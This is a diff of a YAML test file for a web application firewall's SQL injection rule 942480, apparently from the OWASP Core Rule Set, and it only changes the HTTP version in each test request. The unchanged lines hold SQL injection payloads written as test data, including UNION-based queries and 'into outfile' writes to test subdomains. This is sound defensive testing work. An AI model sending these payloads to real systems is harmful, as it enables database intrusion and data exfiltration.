@@ -17,7 +17,7 @@ tests:
           port: 80
           # variable name boundary attacks
           uri: "/get?'msdasql'"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -36,7 +36,7 @@ tests:
           method: POST
           port: 80
           uri: "/post"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -53,7 +53,7 @@ tests:
           port: 80
           uri: "/post"
           data: "var=EmptyValue into outfile '\\\\\\\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\\\\xct'; --"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -70,7 +70,7 @@ tests:
           port: 80
           uri: "/post"
           data: "var=/config.ini' into outfile '\\\\\\\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\\\\yxq'; --"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -87,7 +87,7 @@ tests:
           port: 80
           uri: "/post"
           data: "var=0.3480567293179807' UNION ALL select NULL --"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -104,7 +104,7 @@ tests:
           port: 80
           uri: "/post"
           data: "var=config.ini\") UNION ALL select NULL --"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -121,7 +121,7 @@ tests:
           port: 80
           uri: "/post"
           data: "var=CRS) UNION ALL select NULL --"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -138,7 +138,7 @@ tests:
           port: 80
           uri: "/post"
           data: "var=CRS3\") UNION ALL select NULL --"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -154,7 +154,7 @@ tests:
           method: GET
           port: 80
           uri: "/get/index.php?id=overlay(password%20placing%20%27%27%20from%201%20for%200)::int"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -170,7 +170,7 @@ tests:
           method: GET
           port: 80
           uri: "/get"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -187,7 +187,7 @@ tests:
           method: GET
           port: 80
           uri: "/get"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
@@ -203,7 +203,7 @@ tests:
           method: GET
           port: 80
           uri: "/get/index.php?id=overlay(password%0aplacing%0a%27%27%0afrom%201%20for%200)::int"
-          version: HTTP/1.0
+          version: HTTP/1.1
         output:
           log:
             expect_ids: [942480]
